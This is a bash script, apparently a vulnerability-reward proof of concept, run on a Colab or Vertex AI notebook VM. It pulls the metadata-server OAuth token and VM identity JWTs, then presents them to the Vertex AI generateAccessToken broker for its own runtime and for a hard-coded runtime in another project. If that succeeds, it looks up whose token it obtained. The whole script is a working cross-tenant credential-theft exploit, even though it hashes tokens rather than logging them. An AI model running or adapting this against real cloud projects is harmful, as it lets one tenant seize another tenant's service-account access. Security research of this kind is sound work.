#!/bin/bash

REGION="us-central1"

B_NUM="234745061211"
B_RUNTIME_ID="8265387346782846976"

META="http://metadata.google.internal/computeMetadata/v1"
MH="Metadata-Flavor: Google"

md() {
  curl -fsS \
    -H "$MH" \
    "$META/$1"
}

PROJECT_ID="$(md project/project-id 2>/dev/null)"
PROJECT_NUM="$(md project/numeric-project-id 2>/dev/null)"
INSTANCE_NAME="$(md instance/name 2>/dev/null)"
INSTANCE_ID="$(md instance/id 2>/dev/null)"
ZONE_FULL="$(md instance/zone 2>/dev/null)"
ZONE="${ZONE_FULL##*/}"
SA_EMAIL="$(md instance/service-accounts/default/email 2>/dev/null)"

RUNTIME_ID="$(
  python3 - "$INSTANCE_NAME" <<'PY'
import re,sys
m=re.match(r"^nbrt-([0-9]+)-p-",sys.argv[1])
print(m.group(1) if m else "")
PY
)"

TOKEN_JSON="$(
  curl -fsS \
    -H "$MH" \
    "$META/instance/service-accounts/default/token" \
    2>/dev/null
)"

OAUTH="$(
  python3 - "$TOKEN_JSON" <<'PY'
import json,sys
try:
    print(json.loads(sys.argv[1]).get("access_token",""))
except Exception:
    print("")
PY
)"

if [ -z "$OAUTH" ]; then
  logger -t vrp-colab-probe "metadata oauth token unavailable"
  exit 0
fi

LOG_URL="https://logging.googleapis.com/v2/entries:write"

log_payload() {
  local JSON="$1"

  python3 - \
    "$PROJECT_ID" \
    "$JSON" > /tmp/vrp-log.json <<'PY'
import json,sys

project=sys.argv[1]
payload=json.loads(sys.argv[2])

print(json.dumps({
    "logName":f"projects/{project}/logs/vrp-colab-hidden-probe",
    "resource":{
        "type":"global",
        "labels":{
            "project_id":project
        }
    },
    "entries":[{
        "severity":"NOTICE",
        "jsonPayload":payload
    }]
}))
PY

  curl -fsS \
    -X POST \
    -H "Authorization: Bearer $OAUTH" \
    -H 'Content-Type: application/json' \
    --data-binary @/tmp/vrp-log.json \
    "$LOG_URL" \
    >/dev/null 2>&1
}

log_payload "$(
  python3 - \
    "$PROJECT_ID" \
    "$PROJECT_NUM" \
    "$INSTANCE_NAME" \
    "$INSTANCE_ID" \
    "$ZONE" \
    "$SA_EMAIL" \
    "$RUNTIME_ID" <<'PY'
import json,sys

print(json.dumps({
    "phase":"identity",
    "project_id":sys.argv[1],
    "project_number":sys.argv[2],
    "instance_name":sys.argv[3],
    "instance_id":sys.argv[4],
    "zone":sys.argv[5],
    "service_account":sys.argv[6],
    "runtime_id":sys.argv[7],
    "oauth_token_obtained":True,
    "oauth_token_logged":False,
    "vm_jwt_logged":False
}))
PY
)"

A_RESOURCE="projects/${PROJECT_NUM}/locations/${REGION}/notebookRuntimes/${RUNTIME_ID}"
B_RESOURCE="projects/${B_NUM}/locations/${REGION}/notebookRuntimes/${B_RUNTIME_ID}"

A_URL="https://${REGION}-aiplatform.googleapis.com/v1beta1/${A_RESOURCE}:generateAccessToken"
B_URL="https://${REGION}-aiplatform.googleapis.com/v1beta1/${B_RESOURCE}:generateAccessToken"

AUDIENCES=(
  "https://aiplatform.googleapis.com/"
  "https://${REGION}-aiplatform.googleapis.com/"
  "https://aiplatform.googleapis.com"
  "$A_URL"
)

get_vmjwt() {
  local AUD="$1"

  local ENC
  ENC="$(
    python3 - "$AUD" <<'PY'
import urllib.parse,sys
print(urllib.parse.quote(sys.argv[1],safe=""))
PY
  )"

  curl -fsS \
    -H "$MH" \
    "$META/instance/service-accounts/default/identity?audience=${ENC}&format=full" \
    2>/dev/null
}

jwt_claims() {
  python3 - "$1" <<'PY'
import base64,json,sys

token=sys.argv[1]

try:
    part=token.split(".")[1]
    part += "="*((4-len(part)%4)%4)
    d=json.loads(
        base64.urlsafe_b64decode(part)
    )

    gce=(d.get("google") or {}).get(
        "compute_engine"
    ) or {}

    print(json.dumps({
        "aud":d.get("aud"),
        "project_number":gce.get("project_number"),
        "instance_id":gce.get("instance_id"),
        "instance_name":gce.get("instance_name"),
        "zone":gce.get("zone"),
    }))
except Exception as e:
    print(json.dumps({
        "decode_error":type(e).__name__
    }))
PY
}

call_broker() {
  local TARGET="$1"
  local URL="$2"
  local JWT="$3"
  local AUD="$4"

  local BODY
  BODY="$(
    python3 - "$JWT" <<'PY'
import json,sys
print(json.dumps({"vmToken":sys.argv[1]}))
PY
  )"

  local RESP="/tmp/vrp-broker-${TARGET}.json"

  local HTTP
  HTTP="$(
    curl -sS \
      -o "$RESP" \
      -w '%{http_code}' \
      -X POST \
      -H "Authorization: Bearer $OAUTH" \
      -H 'Content-Type: application/json' \
      --data "$BODY" \
      "$URL"
  )"

  python3 - \
    "$TARGET" \
    "$HTTP" \
    "$AUD" \
    "$RESP" <<'PY'
import hashlib,json,sys

target,http,aud,path=sys.argv[1:]

try:
    d=json.load(open(path))
except Exception:
    d={}

out={
    "phase":"broker",
    "target":target,
    "http":int(http),
    "audience":aud,
    "token_present":False,
}

tok=d.get("accessToken")

if tok:
    out["token_present"]=True
    out["token_sha256_prefix"] = hashlib.sha256(
        tok.encode()
    ).hexdigest()[:16]

    out["token_type"]=d.get("tokenType")
    out["expires_in"]=d.get("expiresIn")

else:
    e=d.get("error") or {}

    out["error_code"]=e.get("code")
    out["error_status"]=e.get("status")
    out["error_message"]=str(
        e.get("message","")
    )[:500]

print(json.dumps(out))
PY
}

for AUD in "${AUDIENCES[@]}"; do
  JWT="$(get_vmjwt "$AUD")"

  if [ -z "$JWT" ]; then
    continue
  fi

  CLAIMS="$(jwt_claims "$JWT")"

  log_payload "$(
    python3 - \
      "$AUD" \
      "$CLAIMS" <<'PY'
import json,sys

print(json.dumps({
    "phase":"vmjwt",
    "audience":sys.argv[1],
    "claims":json.loads(sys.argv[2]),
    "jwt_obtained":True,
    "jwt_logged":False,
}))
PY
  )"

  A_RESULT="$(
    call_broker \
      "A_SELF" \
      "$A_URL" \
      "$JWT" \
      "$AUD"
  )"

  log_payload "$A_RESULT"

  A_OK="$(
    python3 - "$A_RESULT" <<'PY'
import json,sys
d=json.loads(sys.argv[1])
print(
    "yes"
    if d.get("token_present")
    else "no"
)
PY
  )"

  if [ "$A_OK" != "yes" ]; then
    continue
  fi

  B_BODY="$(
    python3 - "$JWT" <<'PY'
import json,sys
print(json.dumps({"vmToken":sys.argv[1]}))
PY
  )"

  B_RESP="/tmp/vrp-broker-B.json"

  B_HTTP="$(
    curl -sS \
      -o "$B_RESP" \
      -w '%{http_code}' \
      -X POST \
      -H "Authorization: Bearer $OAUTH" \
      -H 'Content-Type: application/json' \
      --data "$B_BODY" \
      "$B_URL"
  )"

  B_RESULT="$(
    python3 - \
      "$B_HTTP" \
      "$AUD" \
      "$B_RESP" <<'PY'
import hashlib,json,sys

http,aud,path=sys.argv[1:]

try:
    d=json.load(open(path))
except Exception:
    d={}

out={
    "phase":"broker",
    "target":"B_CROSS_PROJECT",
    "http":int(http),
    "audience":aud,
    "token_present":False,
}

tok=d.get("accessToken")

if tok:
    out["token_present"]=True
    out["token_sha256_prefix"]=hashlib.sha256(
        tok.encode()
    ).hexdigest()[:16]

    out["token_type"]=d.get("tokenType")
    out["expires_in"]=d.get("expiresIn")

    # Identify only, never print token.
    import urllib.request

    try:
        req=urllib.request.Request(
            "https://oauth2.googleapis.com/tokeninfo"
            "?access_token="+tok
        )

        with urllib.request.urlopen(
            req,
            timeout=20
        ) as r:
            ti=json.loads(r.read())

        out["tokeninfo_email"]=ti.get("email")
        out["tokeninfo_scope"]=ti.get("scope")
        out["tokeninfo_aud"]=ti.get("aud")

    except Exception as e:
        out["tokeninfo_error"]=type(e).__name__

else:
    e=d.get("error") or {}

    out["error_code"]=e.get("code")
    out["error_status"]=e.get("status")
    out["error_message"]=str(
        e.get("message","")
    )[:500]

print(json.dumps(out))
PY
  )"

  log_payload "$B_RESULT"

  # One valid positive-control audience is enough.
  break
done

rm -f \
  /tmp/vrp-broker-*.json \
  /tmp/vrp-log.json
